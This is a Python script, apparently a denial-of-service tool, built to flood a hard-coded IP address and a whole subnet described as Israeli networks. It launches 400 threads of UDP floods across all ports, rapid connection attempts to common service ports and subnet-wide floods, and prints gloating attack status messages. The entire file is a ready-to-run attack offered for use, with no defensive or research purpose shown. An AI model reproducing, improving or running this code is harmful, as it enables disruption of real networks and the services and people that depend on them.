import socket
import threading
import time
import random
import ipaddress

# TARGET: Israeli network IP
TARGET_IP = "62.109.121.42"
TARGET_SUBNET = "45.60.39.0/24"  # Whole Psychz block

# Colors for output
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
RESET = '\033[0m'

# ==================== MK2 ATTACK ENGINE ====================
class MK2IsraeliDisruptor:
    def __init__(self):
        self.packets_sent = 0
        self.syn_sent = 0
        self.udp_sent = 0
        self.stats_lock = threading.Lock()
        self.attack_active = True
        
    # ========== UDP CARPET BOMB ==========
    def udp_carpet_bomb(self, target_ip, worker_id):
        """UDP flood across all ports"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Israeli-specific payloads
        il_payloads = [
            b'\x00' * 512,  # Null bomb
            b'\xFF' * 512,  # Full bomb
            b'\xAA\x55' * 256,  # Pattern bomb
            b'IL_DISRUPT' * 50,  # Text bomb
            random.randbytes(512),  # Random bomb
        ]
        
        while self.attack_active:
            try:
                # Select payload
                payload = random.choice(il_payloads)
                
                # Attack ALL ports (1-65535)
                port = random.randint(1, 65535)
                
                # BOMB
                sock.sendto(payload, (target_ip, port))
                
                with self.stats_lock:
                    self.packets_sent += 1
                    self.udp_sent += 1
                    
            except:
                try:
                    sock.close()
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                except:
                    pass
    
    # ========== SYN CONNECTION STORM ==========
    def syn_connection_storm(self, target_ip, worker_id):
        """SYN flood to critical Israeli ports"""
        
        # Israeli critical service ports
        il_critical_ports = [
            80,    # HTTP (gov websites)
            443,   # HTTPS (secure services)
            22,    # SSH (administration)
            21,    # FTP (file transfers)
            25,    # SMTP (email)
            53,    # DNS (network services)
            123,   # NTP (time services)
            161,   # SNMP (network monitoring)
            162,   # SNMP traps
            389,   # LDAP (directory services)
            636,   # LDAPS (secure directory)
            3389,  # RDP (remote desktop)
            5900,  # VNC (remote access)
            8080,  # HTTP-alt (proxies)
            8443,  # HTTPS-alt (secure proxies)
        ]
        
        while self.attack_active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.01)
                
                # Attack critical Israeli port
                port = random.choice(il_critical_ports)
                
                # SYN ATTACK
                result = sock.connect_ex((target_ip, port))
                
                with self.stats_lock:
                    self.packets_sent += 1
                    self.syn_sent += 1
                
                sock.close()
                
            except:
                pass
    
    # ========== SUBNET CARPET BOMB ==========
    def subnet_carpet_bomb(self, cidr_range, worker_id):
        """Attack entire Israeli subnet"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Generate all IPs in subnet
        network = ipaddress.ip_network(cidr_range)
        ip_list = [str(ip) for ip in network.hosts()]
        
        if not ip_list:  # If /32 or small subnet
            ip_list = [cidr_range.split('/')[0]]
        
        while self.attack_active:
            try:
                # Select random IP from subnet
                target_ip = random.choice(ip_list)
                
                # Random payload
                payload = random.randbytes(random.randint(64, 1024))
                
                # Random port
                port = random.randint(1, 65535)
                
                # BOMB ENTIRE SUBNET
                sock.sendto(payload, (target_ip, port))
                
                with self.stats_lock:
                    self.packets_sent += 1
                    self.udp_sent += 1
                    
            except:
                try:
                    sock.close()
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                except:
                    pass
    
    # ========== LAUNCH ATTACKS ==========
    def launch_israeli_attack(self):
        print(f"{RED}╔══════════════════════════════════════════════════════════╗{RESET}")
        print(f"{RED}║               MK2DNS-POISON v2.1 - IL MODE              ║{RESET}")
        print(f"{RED}║           ISRAELI NETWORK DISRUPTION ACTIVE            ║{RESET}")
        print(f"{RED}╚══════════════════════════════════════════════════════════╝{RESET}")
        print()
        print(f"{YELLOW}[+] TARGET IP: {TARGET_IP}{RESET}")
        print(f"{YELLOW}[+] TARGET SUBNET: {TARGET_SUBNET}{RESET}")
        print(f"{YELLOW}[+] ATTACK MODES: UDP CARPET BOMB + SYN CONNECTION STORM{RESET}")
        print(f"{YELLOW}[+] THREAD COUNT: 400 MK2 THREADS{RESET}")
        print()
        print(f"{RED}{'='*60}{RESET}")
        
        # ========== THREAD DEPLOYMENT ==========
        threads = []
        
        # 200 UDP Carpet Bomb threads (single IP)
        print(f"{CYAN}[+] DEPLOYING 200 UDP CARPET BOMB THREADS...{RESET}")
        for i in range(200):
            t = threading.Thread(target=self.udp_carpet_bomb, args=(TARGET_IP, i))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # 100 SYN Connection Storm threads
        print(f"{CYAN}[+] DEPLOYING 100 SYN CONNECTION STORM THREADS...{RESET}")
        for i in range(100):
            t = threading.Thread(target=self.syn_connection_storm, args=(TARGET_IP, i))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # 100 Subnet Carpet Bomb threads
        print(f"{CYAN}[+] DEPLOYING 100 SUBNET CARPET BOMB THREADS...{RESET}")
        for i in range(100):
            t = threading.Thread(target=self.subnet_carpet_bomb, args=(TARGET_SUBNET, i))
            t.daemon = True
            t.start()
            threads.append(t)
        
        print(f"{GREEN}[✓] 400 MK2 THREADS DEPLOYED{RESET}")
        print(f"{RED}{'='*60}{RESET}")
        
        return threads
    
    # ========== MONITORING ==========
    def monitor_attack(self):
        last_time = time.time()
        start_time = time.time()
        
        while self.attack_active:
            time.sleep(2)
            current_time = time.time()
            elapsed = current_time - last_time
            last_time = current_time
            
            with self.stats_lock:
                pps = int(self.packets_sent / elapsed) if elapsed > 0 else 0
                udp_pps = int(self.udp_sent / elapsed) if elapsed > 0 else 0
                syn_pps = int(self.syn_sent / elapsed) if elapsed > 0 else 0
                
                # Reset counters
                self.packets_sent = 0
                self.udp_sent = 0
                self.syn_sent = 0
            
            # Calculate attack intensity
            total_time = current_time - start_time
            intensity = min(100, 20 + (total_time / 10) + (pps / 1000))
            
            # Attack status based on PPS
            if pps > 50000:
                status = f"{RED}MAXIMUM DESTRUCTION{RESET}"
                effect = "🌋 NETWORK MELTDOWN"
            elif pps > 30000:
                status = f"{MAGENTA}CRITICAL OVERLOAD{RESET}"
                effect = "🔥 ROUTER FRYING"
            elif pps > 15000:
                status = f"{YELLOW}HIGH INTENSITY{RESET}"
                effect = "⚡ HEAVY DISRUPTION"
            elif pps > 5000:
                status = f"{GREEN}MODERATE PRESSURE{RESET}"
                effect = "💥 NETWORK STRESS"
            else:
                status = f"{BLUE}INITIALIZING{RESET}"
                effect = "🎯 ACQUIRING TARGET"
            
            # Display attack status
            print(f"\n{RED}[{time.strftime('%H:%M:%S')}] MK2-IL ATTACK STATUS{RESET}")
            print(f"{CYAN}├─ TARGET: {TARGET_IP}{RESET}")
            print(f"{CYAN}├─ PACKETS: {pps:,}/s (UDP: {udp_pps:,}/s | SYN: {syn_pps:,}/s){RESET}")
            print(f"{CYAN}├─ INTENSITY: {int(intensity)}%{RESET}")
            print(f"{CYAN}├─ STATUS: {status}{RESET}")
            print(f"{CYAN}└─ EFFECT: {effect}{RESET}")
            
            # Critical warnings
            if pps > 40000:
                print(f"{RED}[‼] CRITICAL: Israeli network infrastructure under extreme load{RESET}")
            elif pps > 20000:
                print(f"{YELLOW}[!] WARNING: Significant disruption to target network{RESET}")
            
            # Time-based updates
            if int(total_time) % 30 == 0:  # Every 30 seconds
                print(f"\n{BLUE}[i] ATTACK DURATION: {int(total_time)} seconds{RESET}")
                print(f"{BLUE}[i] ESTIMATED IMPACT: Network congestion, security alerts, resource drain{RESET}")

# ==================== MAIN EXECUTION ====================
if __name__ == "__main__":
    # Initialize MK2 Israeli Disruptor
    mk2 = MK2IsraeliDisruptor()
    
    # Launch attack
    threads = mk2.launch_israeli_attack()
    
    # Start monitoring
    try:
        mk2.monitor_attack()
    except KeyboardInterrupt:
        mk2.attack_active = False
        print(f"\n{RED}[!] MK2 ATTACK TERMINATED{RESET}")
